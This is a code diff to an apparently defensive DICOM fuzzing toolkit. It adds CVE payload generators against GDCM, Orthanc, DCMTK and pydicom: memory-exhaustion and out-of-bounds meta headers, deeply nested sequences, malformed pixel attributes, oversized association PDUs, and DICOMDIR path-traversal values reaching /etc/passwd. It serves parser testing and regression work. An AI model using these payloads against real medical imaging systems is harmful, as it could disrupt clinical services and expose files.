@@ -43,6 +43,18 @@ Targeted (metadata['cve']):
     CVE-2024-33606  - SSRF via URI Value Representation
     CVE-2024-34509  - dcmdata segfault via invalid DIMSE message (black-box analogue)
     CVE-2026-5663   - OS command injection via storescp exec placeholders
+    CVE-2015-8979   - DCMTK dcmnet/DUL string-handling overflow on the wire
+                      (lineage: CVE-2019-1010228, CVE-2021-41689)
+    CVE-2022-2121   - DCMTK NULL pointer dereference parsing a malformed file
+    CVE-2024-47796  - DCMTK determineMinMax improper array index -> OOB write
+    CVE-2025-14607  - DCMTK DcmByteString::makeDicomByteString memory corruption
+    CVE-2026-3650   - GDCM memory-leak DoS via non-standard VR in file meta
+    CVE-2026-5437   - Orthanc DicomStreamReader meta-header OOB read
+                      (sibling CVE-2026-5442; batch CVE-2026-5437..5445)
+    CVE-2026-10528  - Orthanc/DCMTK stack overflow via DcmItem::read recursion
+                      (structural trigger / regression seed, like the UAF entries)
+    CVE-2026-32711  - pydicom FileSet/DICOMDIR path traversal via the
+                      Referenced File ID (0004,1500); fixed in pydicom 3.0.2/2.4.5
 
   Config-file CVEs exercised by the grey-box dcmqrscp track live under
   fuzz/configs/malformed/: CVE-2020-36855, CVE-2022-4981.
@@ -1906,6 +1918,704 @@ class CVEAttacks:
 
         return results
 
+    # -------------------------------------------------------------------------
+    # CVE-2026-3650: GDCM memory-leak / resource-exhaustion via non-standard VR
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def cve_2026_3650_gdcm_vr_memory_leak() -> List[AttackResult]:
+        """
+        CVE-2026-3650: Grassroots DICOM (GDCM) memory-leak DoS.
+
+        Parsing a malformed file whose File Meta Information carries a
+        non-standard Value Representation makes GDCM fall back to a wide
+        (32-bit) length field and eagerly allocate a buffer sized to the
+        declared length. A ~150-byte file can drive a ~4.2 GB allocation that
+        is never released — remote, unauthenticated availability impact. No
+        vendor patch at time of writing (CISA ICSMA-26-083-01).
+
+        These payloads place an element with a non-standard VR + an enormous
+        declared length in the (always-parsed) Group 0002 meta header, so the
+        allocation happens before any transfer-syntax negotiation.
+        """
+        results = []
+
+        # Test 1: non-standard VR 'ZZ' on a meta element, 32-bit length ~4 GB.
+        # 0xFFFFFFF0 > 0xFFFF forces Element.encode into the long-form layout
+        # (VR + 2 reserved + 4-byte length), mirroring how GDCM treats an
+        # unknown VR as UN/OB and reads a 32-bit length.
+        df = DicomFile()
+        df.set_meta(
+            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+            transfer_syntax='1.2.840.10008.1.2.1',
+        )
+        df.file_meta.add_element(
+            Element.raw(tag=0x00020099, vr=b'ZZ', value=b'', length=0xFFFFFFF0)
+        )
+        df.dataset = b''
+        results.append(AttackResult(
+            name='cve_2026_3650_01_nonstandard_vr_huge_length',
+            category='cve',
+            payload=df.encode(),
+            description='Meta element with non-standard VR "ZZ" declaring a '
+                        '~4 GB length from a tiny file',
+            expected_behavior='Parser must bound/stream allocation by available '
+                              'bytes, not by the declared length',
+            metadata={'cve': 'CVE-2026-3650', 'library': 'GDCM',
+                      'bug_class': 'allocation-exhaustion',
+                      'target_field': '(0002,0099) non-standard VR'}
+        ))
+
+        # Test 2: unknown VR 'QQ' on the real Private Information tag (0002,0102).
+        df = DicomFile()
+        df.set_meta(
+            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+            transfer_syntax='1.2.840.10008.1.2.1',
+        )
+        df.file_meta.add_element(
+            Element.raw(tag=0x00020102, vr=b'QQ', value=b'\x00', length=0x7FFFFFFF)
+        )
+        df.dataset = b''
+        results.append(AttackResult(
+            name='cve_2026_3650_02_unknown_vr_private_info',
+            category='cve',
+            payload=df.encode(),
+            description='Private Information (0002,0102) with unknown VR "QQ" '
+                        'and a 2 GB declared length',
+            expected_behavior='Parser must not pre-allocate the declared length',
+            metadata={'cve': 'CVE-2026-3650', 'library': 'GDCM',
+                      'bug_class': 'allocation-exhaustion',
+                      'target_field': '(0002,0102) Private Information'}
+        ))
+
+        # Test 3: UN (Unknown) VR in the meta header with undefined/huge length.
+        # UN legitimately uses the 32-bit length form, so a value of 0xFFFFFFF0
+        # is a single oversized allocation request rather than undefined length.
+        df = DicomFile()
+        df.set_meta(
+            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+            transfer_syntax='1.2.840.10008.1.2.1',
+        )
+        df.file_meta.add_element(
+            Element.raw(tag=0x00020099, vr=b'UN', value=b'', length=0xFFFFFFF0)
+        )
+        df.dataset = b''
+        results.append(AttackResult(
+            name='cve_2026_3650_03_un_vr_oversized_length',
+            category='cve',
+            payload=df.encode(),
+            description='UN-typed meta element declaring ~4 GB with no payload',
+            expected_behavior='Parser must validate declared length against the '
+                              'remaining file size',
+            metadata={'cve': 'CVE-2026-3650', 'library': 'GDCM',
+                      'bug_class': 'allocation-exhaustion',
+                      'target_field': '(0002,0099) UN oversized length'}
+        ))
+
+        return results
+
+    # -------------------------------------------------------------------------
+    # CVE-2026-5437 / CVE-2026-5442: Orthanc DicomStreamReader meta-header OOB
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def cve_2026_5437_meta_header_oob() -> List[AttackResult]:
+        """
+        CVE-2026-5437 (and sibling CVE-2026-5442): out-of-bounds read in
+        Orthanc's DicomStreamReader while parsing the DICOM meta header.
+
+        The reader trusts attacker-controlled length/offset fields in the
+        Group 0002 meta header without bounds-checking them against the
+        allocated metadata buffer, so a crafted header steers reads past the
+        end of the buffer (unsafe arithmetic + missing bounds checks). Part of
+        the CVE-2026-5437..5445 Orthanc batch fixed in 1.12.11.
+
+        Black-box deliverable against a live Orthanc SCP; also a seed for the
+        DCMTK/Orthanc grey-box parse track.
+        """
+        results = []
+
+        # Test 1: File Meta Group Length (0002,0000) over-declares the meta
+        # group, so the reader keeps consuming "meta" bytes past EOF.
+        df = DicomFile()
+        df.set_meta(
+            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+            transfer_syntax='1.2.840.10008.1.2.1',
+        )
+        df.file_meta._group_length_override = 0x7FFFFFFF
+        df.dataset = b''
+        results.append(AttackResult(
+            name='cve_2026_5437_01_grouplen_overdeclared',
+            category='cve',
+            payload=df.encode(),
+            description='File Meta Group Length declares 2 GB of meta; actual '
+                        'header is a few dozen bytes',
+            expected_behavior='Reader must clamp meta parsing to the buffer size',
+            metadata={'cve': 'CVE-2026-5437', 'related_cve': 'CVE-2026-5442',
+                      'cve_batch': 'CVE-2026-5437..5445', 'product': 'Orthanc',
+                      'bug_class': 'oob-read',
+                      'target_field': '(0002,0000) File Meta Group Length'}
+        ))
+
+        # Test 2: a meta element whose declared length runs off the end of the
+        # file — a classic OOB read of the metadata buffer.
+        meta_body = struct.pack('<HH', 0x0002, 0x0010) + b'UI'
+        meta_body += struct.pack('<H', 0xFFF0)  # declared 65520, only a few bytes follow
+        meta_body += b'1.2.840.10008.1.2.1'     # truncated value, no trailing bytes
+        payload = b'\x00' * 128 + b'DICM'
+        payload += struct.pack('<HH', 0x0002, 0x0000) + b'UL' + struct.pack('<H', 4)
+        payload += struct.pack('<I', len(meta_body))
+        payload += meta_body
+        results.append(AttackResult(
+            name='cve_2026_5437_02_element_length_past_eof',
+            category='cve',
+            payload=payload,
+            description='Transfer Syntax UID in meta declares 0xFFF0 bytes but '
+                        'the file ends mid-value',
+            expected_behavior='Reader must detect the truncated meta element',
+            metadata={'cve': 'CVE-2026-5437', 'related_cve': 'CVE-2026-5442',
+                      'product': 'Orthanc', 'bug_class': 'oob-read',
+                      'target_field': '(0002,0010) Transfer Syntax UID'}
+        ))
+
+        # Test 3: arithmetic-overflow length (~0xFFFFFFFF) in the meta header;
+        # length + cursor wraps and slips past the bounds check.
+        meta_body = struct.pack('<HH', 0x0002, 0x0003) + b'UI'
+        meta_body += b'\x00\x00'                    # reserved (long form)
+        meta_body += struct.pack('<I', 0xFFFFFFFE)  # near-UINT32_MAX length
+        meta_body += b'1.2.3'
+        payload = b'\x00' * 128 + b'DICM'
+        payload += struct.pack('<HH', 0x0002, 0x0000) + b'UL' + struct.pack('<H', 4)
+        payload += struct.pack('<I', len(meta_body))
+        payload += meta_body
+        results.append(AttackResult(
+            name='cve_2026_5437_03_length_arithmetic_overflow',
+            category='cve',
+            payload=payload,
+            description='Meta SOP Instance UID with a near-UINT32_MAX length to '
+                        'overflow cursor + length arithmetic',
+            expected_behavior='Reader must use overflow-safe bounds checks',
+            metadata={'cve': 'CVE-2026-5437', 'related_cve': 'CVE-2026-5442',
+                      'product': 'Orthanc', 'bug_class': 'oob-read',
+                      'target_field': '(0002,0003) Media Storage SOP Instance UID'}
+        ))
+
+        # Test 4: Group Length under-declares, then a real element follows; the
+        # reader may mis-track where meta ends and read adjacent memory.
+        df = DicomFile()
+        df.set_meta(
+            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+            transfer_syntax='1.2.840.10008.1.2.1',
+        )
+        df.file_meta._group_length_override = 2
+        df.dataset = b''
+        results.append(AttackResult(
+            name='cve_2026_5437_04_grouplen_underdeclared',
+            category='cve',
+            payload=df.encode(),
+            description='File Meta Group Length declares only 2 bytes of a '
+                        'multi-element meta header',
+            expected_behavior='Reader must reconcile group length with parsed '
+                              'element extents',
+            metadata={'cve': 'CVE-2026-5437', 'related_cve': 'CVE-2026-5442',
+                      'product': 'Orthanc', 'bug_class': 'oob-read',
+                      'target_field': '(0002,0000) File Meta Group Length'}
+        ))
+
+        return results
+
+    # -------------------------------------------------------------------------
+    # CVE-2026-10528: Orthanc/DCMTK stack overflow in DcmItem::read
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def cve_2026_10528_dcmitem_read_stack() -> List[AttackResult]:
+        """
+        CVE-2026-10528: stack-based buffer overflow reached through
+        ``DcmItem::read`` (OrthancFramework FromDcmtkBridge / DCMTK parser).
+
+        Like the use-after-free entries (32135/24793/24794), these are
+        *structural triggers / regression seeds*: a single static buffer cannot
+        by itself guarantee a stack smash, so the payloads steer the recursive
+        ``DcmItem::read`` descent — deeply nested items/sequences — into the
+        vulnerable path rather than reproducing the overflow deterministically.
+        Best used as a grey-box seed against the already-instrumented DCMTK
+        parse target; the engine mutates around the structure.
+        """
+        results = []
+
+        # Test 1: deeply nested undefined-length sequences — each level recurses
+        # one frame deeper into DcmItem::read.
+        depth = 2000
+        data = b''
+        for _ in range(depth):
+            data += struct.pack('<HH', 0x0008, 0x1115)  # Referenced Series Sequence
+            data += b'SQ' + b'\x00\x00'
+            data += struct.pack('<I', 0xFFFFFFFF)       # undefined length
+            data += struct.pack('<HH', 0xFFFE, 0xE000)  # item start
+            data += struct.pack('<I', 0xFFFFFFFF)       # undefined-length item
+        results.append(AttackResult(
+            name='cve_2026_10528_01_deep_sequence_recursion',
+            category='cve',
+            payload=data,
+            description=f'{depth} nested undefined-length sequences driving '
+                        'DcmItem::read recursion',
+            expected_behavior='Parser must bound nesting depth to avoid stack '
+                              'exhaustion',
+            metadata={'cve': 'CVE-2026-10528', 'product': 'Orthanc/DCMTK',
+                      'structural_trigger': True,
+                      'bug_class': 'recursion-stack-exhaustion',
+                      'target_func': 'DcmItem::read'}
+        ))
+
+        # Test 2: deeply nested defined-length items — the explicit-length
+        # variant of the same recursive descent.
+        depth = 1500
+        # Build inside-out so each item's declared length covers its children.
+        inner = b''
+        for _ in range(depth):
+            seq_hdr = struct.pack('<HH', 0x0008, 0x1115) + b'SQ' + b'\x00\x00'
+            item_hdr = struct.pack('<HH', 0xFFFE, 0xE000)
+            item_body = item_hdr + struct.pack('<I', len(inner)) + inner
+            inner = seq_hdr + struct.pack('<I', len(item_body)) + item_body
+        results.append(AttackResult(
+            name='cve_2026_10528_02_deep_defined_length_items',
+            category='cve',
+            payload=inner,
+            description=f'{depth} nested defined-length items reaching '
+                        'DcmItem::read',
+            expected_behavior='Parser must bound recursion regardless of '
+                              'defined vs undefined length',
+            metadata={'cve': 'CVE-2026-10528', 'product': 'Orthanc/DCMTK',
+                      'structural_trigger': True,
+                      'bug_class': 'recursion-stack-exhaustion',
+                      'target_func': 'DcmItem::read'}
+        ))
+
+        # Test 3: nested sequences wrapped in a Part 10 file so the trigger is
+        # reached via the normal DcmItem::read entry, not a raw fragment.
+        depth = 1000
+        inner = b''
+        for _ in range(depth):
+            inner += struct.pack('<HH', 0x0040, 0xA730)  # Content Sequence
+            inner += b'SQ' + b'\x00\x00'
+            inner += struct.pack('<I', 0xFFFFFFFF)
+            inner += struct.pack('<HH', 0xFFFE, 0xE000)
+            inner += struct.pack('<I', 0xFFFFFFFF)
+        for _ in range(depth):
+            inner += struct.pack('<HH', 0xFFFE, 0xE00D) + struct.pack('<I', 0)
+            inner += struct.pack('<HH', 0xFFFE, 0xE0DD) + struct.pack('<I', 0)
+        df = DicomFile()
+        df.set_meta(
+            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+            transfer_syntax='1.2.840.10008.1.2.1',
+        )
+        df.dataset = inner
+        results.append(AttackResult(
+            name='cve_2026_10528_03_part10_nested_sequences',
+            category='cve',
+            payload=df.encode(),
+            description=f'Part 10 file with {depth} balanced nested sequences',
+            expected_behavior='Parser must bound nesting depth before the stack '
+                              'is exhausted',
+            metadata={'cve': 'CVE-2026-10528', 'product': 'Orthanc/DCMTK',
+                      'structural_trigger': True,
+                      'bug_class': 'recursion-stack-exhaustion',
+                      'target_func': 'DcmItem::read'}
+        ))
+
+        return results
+
+    # -------------------------------------------------------------------------
+    # CVE-2026-32711: pydicom FileSet/DICOMDIR ReferencedFileID path traversal
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def cve_2026_32711_dicomdir_traversal() -> List[AttackResult]:
+        """
+        CVE-2026-32711: path traversal in pydicom FileSet/DICOMDIR.
+
+        A crafted DICOMDIR sets a directory record's Referenced File ID
+        (0004,1500) to components that escape the File-set root. pydicom
+        resolves the path only to confirm it exists, never checking it stays
+        under the root, so FileSet ``copy()`` / ``write()`` /
+        ``remove()+write(use_existing=True)`` perform file I/O outside the root
+        — arbitrary read/copy and, in some flows, move/delete. Affects
+        2.0.0-rc.1 .. 3.0.1; fixed in 2.4.5 / 3.0.2.
+
+        Each payload is a complete Part 10 DICOMDIR (Media Storage Directory
+        Storage, 1.2.840.10008.1.3.10) whose single IMAGE record carries a
+        traversing Referenced File ID. ReferencedFileID is multi-valued CS:
+        each path component is one backslash-delimited value.
+        """
+        media_dir_sop_class = '1.2.840.10008.1.3.10'  # Media Storage Directory Storage
+
+        def _short(group: int, elem: int, vr: bytes, value: bytes) -> bytes:
+            """Explicit VR LE, short-form (2-byte length) element."""
+            if len(value) % 2:
+                value += b'\x00' if vr in (b'UI', b'OB') else b' '
+            return struct.pack('<HH', group, elem) + vr + struct.pack('<H', len(value)) + value
+
+        def _build_dicomdir(ref_file_id: str) -> bytes:
+            # One directory record carrying the traversing Referenced File ID.
+            item = b''
+            item += _short(0x0004, 0x1400, b'UL', struct.pack('<I', 0))   # offset of next record
+            item += _short(0x0004, 0x1410, b'US', struct.pack('<H', 0xFFFF))  # record in-use flag
+            item += _short(0x0004, 0x1420, b'UL', struct.pack('<I', 0))   # offset of lower-level entity
+            item += _short(0x0004, 0x1430, b'CS', b'IMAGE')               # directory record type
+            item += _short(0x0004, 0x1500, b'CS', ref_file_id.encode('ascii'))  # Referenced File ID
+            item += _short(0x0004, 0x1510, b'UI', SECONDARY_CAPTURE_SOP_CLASS_UID.encode())
+            item += _short(0x0004, 0x1511, b'UI', b'1.2.3.4.5')
+
+            # Undefined-length Directory Record Sequence (0004,1220).
+            seq = struct.pack('<HH', 0xFFFE, 0xE000) + b'\xFF\xFF\xFF\xFF'  # item, undefined length
+            seq += item
+            seq += struct.pack('<HH', 0xFFFE, 0xE00D) + struct.pack('<I', 0)  # item delim
+            seq += struct.pack('<HH', 0xFFFE, 0xE0DD) + struct.pack('<I', 0)  # seq delim
+            sq = struct.pack('<HH', 0x0004, 0x1220) + b'SQ' + b'\x00\x00' + b'\xFF\xFF\xFF\xFF' + seq
+
+            dataset = b''
+            dataset += _short(0x0004, 0x1130, b'CS', b'CSCARE')           # File-set ID
+            dataset += _short(0x0004, 0x1200, b'UL', struct.pack('<I', 0))  # offset of first record
+            dataset += _short(0x0004, 0x1202, b'UL', struct.pack('<I', 0))  # offset of last record
+            dataset += _short(0x0004, 0x1212, b'US', struct.pack('<H', 0))  # consistency flag
+            dataset += sq
+
+            df = DicomFile()
+            df.set_meta(
+                sop_class_uid=media_dir_sop_class,
+                sop_instance_uid='1.2.3.4.5',
+                transfer_syntax='1.2.840.10008.1.2.1',
+            )
+            df.dataset = dataset
+            return df.encode()
+
+        results = []
+
+        # Test 1: relative '..' escape (cross-platform; components join with the
+        # OS separator) targeting a sensitive file for read/copy.
+        ref = r'..\..\..\..\..\..\etc\passwd'
+        results.append(AttackResult(
+            name='cve_2026_32711_01_relative_escape',
+            category='cve',
+            payload=_build_dicomdir(ref),
+            description='DICOMDIR ReferencedFileID escapes the File-set root '
+                        'with ".." components to /etc/passwd',
+            expected_behavior='FileSet must reject resolved paths outside the '
+                              'File-set root',
+            metadata={'cve': 'CVE-2026-32711', 'library': 'pydicom',
+                      'fixed_in': '3.0.2 / 2.4.5', 'bug_class': 'path-traversal',
+                      'target_field': '(0004,1500) Referenced File ID',
+                      'referenced_file_id': ref}
+        ))
+
+        # Test 2: absolute-path component (Windows-style) for write/overwrite.
+        ref = r'..\..\..\..\Windows\Temp\c-scare-traversal'
+        results.append(AttackResult(
+            name='cve_2026_32711_02_windows_escape',
+            category='cve',
+            payload=_build_dicomdir(ref),
+            description='DICOMDIR ReferencedFileID escapes the root toward a '
+                        'Windows temp write target',
+            expected_behavior='FileSet must reject resolved paths outside the '
+                              'File-set root',
+            metadata={'cve': 'CVE-2026-32711', 'library': 'pydicom',
+                      'fixed_in': '3.0.2 / 2.4.5', 'bug_class': 'path-traversal',
+                      'target_field': '(0004,1500) Referenced File ID',
+                      'referenced_file_id': ref}
+        ))
+
+        # Test 3: deep traversal landing a write in a startup/web-root path.
+        ref = r'..\..\..\..\..\..\..\..\tmp\c-scare-traversal'
+        results.append(AttackResult(
+            name='cve_2026_32711_03_deep_write_target',
+            category='cve',
+            payload=_build_dicomdir(ref),
+            description='DICOMDIR ReferencedFileID with a deep ".." chain to a '
+                        'world-writable path for copy()/write()',
+            expected_behavior='FileSet must reject resolved paths outside the '
+                              'File-set root',
+            metadata={'cve': 'CVE-2026-32711', 'library': 'pydicom',
+                      'fixed_in': '3.0.2 / 2.4.5', 'bug_class': 'path-traversal',
+                      'target_field': '(0004,1500) Referenced File ID',
+                      'referenced_file_id': ref}
+        ))
+
+        return results
+
+    # -------------------------------------------------------------------------
+    # CVE-2022-2121: DCMTK NULL pointer dereference parsing a DICOM file
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def cve_2022_2121_null_deref() -> List[AttackResult]:
+        """
+        CVE-2022-2121: NULL pointer dereference in DCMTK (< 3.6.7) while
+        processing a malformed DICOM file — a denial-of-service.
+
+        Structural triggers: datasets that steer the parser onto a code path
+        that dereferences an element/sequence pointer the file never actually
+        provides. Deliverable as a file (DAST) or DCMTK parse-track seed.
+        """
+        results = []
+
+        # Test 1: SQ element with a defined length of 0 — an empty sequence
+        # where the parser may dereference the (absent) first item.
+        ds = Dataset()
+        ds / Element(0x0008, 0x1115, 'SQ', b'')   # Referenced Series Sequence, empty
+        payload = DicomFile.build(
+            ds.encode(implicit_vr=False),
+            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+        )
+        results.append(AttackResult(
+            name='cve_2022_2121_01_empty_defined_sequence',
+            category='cve',
+            payload=payload,
+            description='Zero-length defined SQ where an item is expected',
+            expected_behavior='Parser must null-check before dereferencing the '
+                              'first sequence item',
+            metadata={'cve': 'CVE-2022-2121', 'product': 'DCMTK',
+                      'structural_trigger': True, 'bug_class': 'null-deref'}
+        ))
+
+        # Test 2: pixel-data SQ (encapsulated) with no Basic Offset Table item —
+        # codecs that assume a BOT pointer may dereference null.
+        data = struct.pack('<HH', 0x7FE0, 0x0010) + b'OB' + b'\x00\x00'
+        data += struct.pack('<I', 0xFFFFFFFF)        # undefined length (encapsulated)
+        data += struct.pack('<HH', 0xFFFE, 0xE0DD)   # sequence delim — no BOT, no fragments
+        data += struct.pack('<I', 0)
+        payload = DicomFile.build(
+            data, sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+            transfer_syntax_uid='1.2.840.10008.1.2.4.50',  # JPEG Baseline (encapsulated)
+        )
+        results.append(AttackResult(
+            name='cve_2022_2121_02_encapsulated_no_bot',
+            category='cve',
+            payload=payload,
+            description='Encapsulated Pixel Data with neither Basic Offset Table '
+                        'nor fragments',
+            expected_behavior='Codec must null-check the offset table / first '
+                              'fragment',
+            metadata={'cve': 'CVE-2022-2121', 'product': 'DCMTK',
+                      'structural_trigger': True, 'bug_class': 'null-deref'}
+        ))
+
+        return results
+
+    # -------------------------------------------------------------------------
+    # CVE-2025-14607: DCMTK DcmByteString::makeDicomByteString memory corruption
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def cve_2025_14607_bytestring_corruption() -> List[AttackResult]:
+        """
+        CVE-2025-14607: memory corruption in
+        ``DcmByteString::makeDicomByteString`` (dcmdata/libsrc/dcbytstr.cc),
+        DCMTK <= 3.6.9. Reached through any byte-string VR element (CS, LO, SH,
+        PN, UI, DA, TM, ...) whose declared length is pathological — the
+        normalize/pad step then writes out of bounds.
+
+        File-deliverable (DAST) and a DCMTK parse-track seed.
+        """
+        results = []
+
+        # Test 1: byte-string VR (LO) lying about a huge length (long form).
+        ds = Dataset()
+        ds._force_append(Element.raw(tag=0x00081030, vr=b'LO', value=b'A',
+                                     length=0xFFFFFFFE))  # Study Description
+        payload = DicomFile.build(
+            ds.encode(implicit_vr=False),
+            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+        )
+        results.append(AttackResult(
+            name='cve_2025_14607_01_huge_lo_length',
+            category='cve',
+            payload=payload,
+            description='Study Description (LO) declaring a near-UINT32_MAX length',
+            expected_behavior='String normalisation must bound-check the declared '
+                              'length',
+            metadata={'cve': 'CVE-2025-14607', 'product': 'DCMTK',
+                      'bug_class': 'memory-corruption',
+                      'target_func': 'DcmByteString::makeDicomByteString'}
+        ))
+
+        # Test 2: odd-length CS value — makeDicomByteString pads odd lengths to
+        # even; a crafted odd length stresses that write.
+        ds = Dataset()
+        ds._force_append(Element.raw(tag=0x00080060, vr=b'CS', value=b'ABC',
+                                     length=3))  # Modality, odd declared length
+        payload = DicomFile.build(
+            ds.encode(implicit_vr=False),
+            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+        )
+        results.append(AttackResult(
+            name='cve_2025_14607_02_odd_length_cs',
+            category='cve',
+            payload=payload,
+            description='Modality (CS) with an odd declared length triggering '
+                        'pad-to-even',
+            expected_behavior='Padding logic must not write past the buffer',
+            metadata={'cve': 'CVE-2025-14607', 'product': 'DCMTK',
+                      'bug_class': 'memory-corruption',
+                      'target_func': 'DcmByteString::makeDicomByteString'}
+        ))
+
+        # Test 3: PN value packed with separators and an over-declared length.
+        ds = Dataset()
+        ds._force_append(Element.raw(tag=0x00100010, vr=b'PN',
+                                     value=b'A^B^C^D^E', length=0xFFFE))
+        payload = DicomFile.build(
+            ds.encode(implicit_vr=False),
+            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+        )
+        results.append(AttackResult(
+            name='cve_2025_14607_03_pn_overdeclared',
+            category='cve',
+            payload=payload,
+            description='Patient Name (PN) over-declaring its length',
+            expected_behavior='String normalisation must bound-check the declared '
+                              'length',
+            metadata={'cve': 'CVE-2025-14607', 'product': 'DCMTK',
+                      'bug_class': 'memory-corruption',
+                      'target_func': 'DcmByteString::makeDicomByteString'}
+        ))
+
+        return results
+
+    # -------------------------------------------------------------------------
+    # CVE-2024-47796: DCMTK determineMinMax improper array index -> OOB write
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def cve_2024_47796_determine_minmax_oob() -> List[AttackResult]:
+        """
+        CVE-2024-47796: improper array-index validation in ``determineMinMax``
+        (dcmimgle), DCMTK 3.6.8 — a crafted image leads to an out-of-bounds
+        write while scanning pixel values for their min/max.
+
+        Structural triggers: inconsistent Bits Allocated / Bits Stored / High
+        Bit / pixel-count attributes make the min/max scan index outside the
+        pixel buffer. Reached through any dcmimgle front-end (dcm2pnm,
+        dcm2img); file-deliverable and a pixel grey-box seed.
+        """
+        def _img(bits_alloc, bits_stored, high_bit, pixel_repr, rows, cols,
+                 pixel_bytes):
+            ds = Dataset()
+            ds / Element(0x0008, 0x0060, 'CS', 'OT')             # Modality
+            ds / Element(0x0028, 0x0002, 'US', 1)                # Samples per Pixel
+            ds / Element(0x0028, 0x0004, 'CS', 'MONOCHROME2')    # Photometric
+            ds / Element(0x0028, 0x0010, 'US', rows)             # Rows
+            ds / Element(0x0028, 0x0011, 'US', cols)             # Columns
+            ds / Element(0x0028, 0x0100, 'US', bits_alloc)       # Bits Allocated
+            ds / Element(0x0028, 0x0101, 'US', bits_stored)      # Bits Stored
+            ds / Element(0x0028, 0x0102, 'US', high_bit)         # High Bit
+            ds / Element(0x0028, 0x0103, 'US', pixel_repr)       # Pixel Representation
+            ds / Element.raw(tag=0x7FE00010, vr=b'OW', value=pixel_bytes)
+            return DicomFile.build(
+                ds.encode(implicit_vr=False),
+                sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+                sop_instance_uid='1.2.3.4.5',
+            )
+
+        results = []
+
+        # Test 1: Bits Stored / High Bit exceed Bits Allocated — bit math used
+        # to mask each sample indexes outside the value range.
+        results.append(AttackResult(
+            name='cve_2024_47796_01_bits_exceed_allocated',
+            category='cve',
+            payload=_img(bits_alloc=8, bits_stored=16, high_bit=31,
+                         pixel_repr=1, rows=4, cols=4, pixel_bytes=b'\x80' * 32),
+            description='Bits Stored=16 / High Bit=31 with Bits Allocated=8',
+            expected_behavior='Renderer must validate bit fields before scanning '
+                              'pixel min/max',
+            metadata={'cve': 'CVE-2024-47796', 'product': 'DCMTK',
+                      'structural_trigger': True, 'bug_class': 'oob-write',
+                      'target_func': 'determineMinMax'}
+        ))
+
+        # Test 2: Rows*Columns claim far more pixels than Pixel Data provides —
+        # the min/max scan walks past the end of the buffer.
+        results.append(AttackResult(
+            name='cve_2024_47796_02_dimensions_exceed_pixels',
+            category='cve',
+            payload=_img(bits_alloc=16, bits_stored=16, high_bit=15,
+                         pixel_repr=0, rows=1024, cols=1024, pixel_bytes=b'\x00' * 16),
+            description='Rows*Columns=1M but only 16 bytes of Pixel Data',
+            expected_behavior='Renderer must bound the scan by the actual pixel '
+                              'buffer length',
+            metadata={'cve': 'CVE-2024-47796', 'product': 'DCMTK',
+                      'structural_trigger': True, 'bug_class': 'oob-write',
+                      'target_func': 'determineMinMax'}
+        ))
+
+        return results
+
+    # -------------------------------------------------------------------------
+    # CVE-2015-8979 (+ CVE-2019-1010228 / CVE-2021-41689): DCMTK dcmnet/DUL
+    # string-handling overflow on the wire
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def cve_2015_8979_dul_string_overflow() -> List[AttackResult]:
+        """
+        CVE-2015-8979: remote buffer overflow in DCMTK's DUL (dcmnet) network
+        layer via overlong association fields — the lineage continued in
+        CVE-2019-1010228 (association OOB write) and CVE-2021-41689
+        (``DU_getStringDOElement`` buffer overflow). These are PDU/DIMSE-side
+        string-length bugs: deliver as A-ASSOCIATE PDUs (DAST) or AFLNet seeds.
+        """
+        results = []
+
+        # Reuse the protocol overlong-AE-title PDU and tag its CVE lineage.
+        base = ProtocolAttacks.overlong_ae_title()
+        results.append(AttackResult(
+            name='cve_2015_8979_01_overlong_ae_title',
+            category='cve',
+            payload=base.payload,
+            description='A-ASSOCIATE-RQ with AE title past the 16-byte field '
+                        '(DUL string overflow)',
+            expected_behavior='DUL must bound-copy fixed-width association fields',
+            metadata={'cve': 'CVE-2015-8979',
+                      'related_cve': 'CVE-2019-1010228, CVE-2021-41689',
+                      'product': 'DCMTK', 'bug_class': 'buffer-overflow',
+                      'target_func': 'DUL / DU_getStringDOElement'}
+        ))
+
+        # PDU whose declared length vastly exceeds the bytes that follow — the
+        # DUL reader may copy past the receive buffer.
+        if not SCAPY_AVAILABLE:
+            payload = b'\x01\x00' + struct.pack('!I', 0x7FFFFFFF) + b'X' * 64
+        else:
+            pkt = DICOM(length=0x7FFFFFFF) / A_ASSOCIATE_RQ(
+                called_ae_title='TARGET', calling_ae_title='ATTACKER')
+            payload = raw(pkt)
+        results.append(AttackResult(
+            name='cve_2015_8979_02_oversized_pdu_length',
+            category='cve',
+            payload=payload,
+            description='A-ASSOCIATE-RQ PDU declaring a ~2 GB length',
+            expected_behavior='DUL must reconcile the PDU length with bytes '
+                              'actually read',
+            metadata={'cve': 'CVE-2015-8979',
+                      'related_cve': 'CVE-2019-1010228',
+                      'product': 'DCMTK', 'bug_class': 'buffer-overflow',
+                      'target_func': 'DUL PDU reader'}
+        ))
+
+        return results
+
     @classmethod
     def all(cls) -> Generator[AttackResult, None, None]:
         """Yield every CVE attack payload (flattened from lists)."""
@@ -1913,6 +2623,14 @@ class CVEAttacks:
